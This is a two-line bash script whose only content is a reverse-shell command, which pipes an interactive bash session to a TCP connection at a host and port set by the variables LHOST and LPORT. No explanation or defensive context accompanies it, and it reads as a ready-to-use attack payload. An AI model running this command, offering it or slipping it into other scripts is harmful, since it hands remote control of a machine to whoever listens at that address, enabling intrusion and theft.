#!/bin/bash

/bin/bash -i >& "/dev/tcp/$LHOST/$LPORT" 0>&1
